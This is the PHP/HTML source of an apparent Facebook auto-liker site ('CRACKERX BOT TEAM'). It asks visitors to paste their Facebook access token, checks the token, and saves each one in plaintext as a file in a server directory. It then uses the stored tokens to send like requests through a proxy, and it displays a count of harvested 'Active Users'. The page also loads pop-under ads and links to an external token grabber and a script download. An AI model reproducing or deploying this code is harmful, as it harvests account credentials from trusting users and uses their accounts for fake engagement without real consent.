<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>
<script type="text/javascript"> 
    var adfly_id = 19418292; 
    var popunder_frequency_delay = 0; 
</script> 
<script src="https://cdn.adf.ly/js/display.js"></script> 
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
SAHIBWEB.XYZ
</title><link rel="stylesheet" type="text/css" href="B.css"
<link href="https://fonts.googleapis.com/css?family=Audiowide+Iceland" rel="stylesheet"> 
<center><font size="5"><script language="JavaScript" src="header.js"></script></font></center><br>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <link rel="shortcut icon" href="https://i.imgur.com/h6NWYI8.png">
<meta property="og:image" content="https://i.imgur.com/FBYFvb8.jpg" />
  <marquee direction="left" width="60%">  <font face="Audiowide" size="6"><font color ="red">❤️</font><font color ="blue"> CRACKERX BOT TEAM</font>  <font color ="red">❤️</font><font color ="red"></marquee></font><br>
<center><div style="font-family: 'Iceland', cursive;
font-size: 32pt">
<strong><center><script language="JavaScript" src="B.js"></script></font></center></strong>

<?php
$yx=opendir('mahal');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> mahal($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function mahal($access){
if(!is_dir('mahal')){
mkdir('mahal');
}
$a=fopen('mahal/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script>window.alert("Your Token is Invalid, Try Again :)");</script>';
$this->form();
}
public function form(){
 echo '
 </br>
 
<strong><center> <a target="_blank"  https://www.facebook.com/100014994432699"><img src="https://graph.facebook.com/100014994432699/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 14px 10px 	white; padding: 0px;" width="250" height="250" title="hax3r"/></a></div></div>
 </br>  </br> <div class="css">
      </ul></div> <!-- /intro-social --> <br>
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
<center><div style="font-family: Iceland;
font-size: 32pt">
<div id="center">

<center><div style="font-family: Audiowide;
font-size: 30pt"><a href="http://khan-zz.herokuapp.com" target="_blank">

<input class="button" type="button" value="GET TOKEN HERE"></a>

<a href="http://neswery.com/1mN9" target="_blank">

<input class="button" type="button" value="DOWNLOAD SCRIPT"></a></center>

<br>
<form action="index.php" method="post">

<input class="search" type="text1" style="width:63%" name="access_token" placeholder="Paste Your Access Token Here" required></br>

<input class="submit" type="submit" value="Submit"></form></div>
</form></center><br>
</font><br>
<center>
<center>
<center><script language="JavaScript" src=""></script></font></center>
<div style="font-family:Iceland;
<center><font face="Audiowide" size="3" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em aqua;"><font size="25"> Made By : </font><font color="red" size="26"> Sahib Khaan</a></font></br>
</a></center></div></div></body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

<center>
<center> <a target="_blank"  https://www.facebook.com/100014994432699"><img src="https://graph.facebook.com/100014994432699/picture?type=large" alt="" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 15px 10px 	white; padding: 0px;" width="250" height="250" title=""/></a></div></div>

<br>
<link href="https://fonts.googleapis.com/css?family=Audiowide"  rel="stylesheet" </center>


</br>

<div id="center">
<strong><center> <font color="white">
<center>
<font color="white" size="20">  Token Saved! </font></br><font size="20">
[<a href="index.php" value="Click Here"><font color="red" size="19">Click Here</font></a>] to go back to the home page.</div></center></font>
</br>
</div>
<br><center>
<div style="font-family: Iceland;
<font color="white" size="15"><center><font face="Audiowide" size="4" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em red;"> Owner : <font color="red">Sahib Khaan</strong></a></center>
</div>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
<br>
<link href="https://fonts.googleapis.com/css?family=Iceland"  rel="stylesheet" type="text/css">

<center></center><strong><div style="font-family: 'Audiowide', Nova;
<div id="header">
<center><font face="Audiowide" size="3" style="background: url(&quot;&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em red;"><font size="20"><?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'mahal/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // </strong> prints out how many were in the directory
    echo "Active Users : $i "; ?></center></font>
</div></center>
 
<script language="javascript" type="text/javascript" src="heart.js"></script>
<div class="kddtop"> <div class="kddtut"> <p>
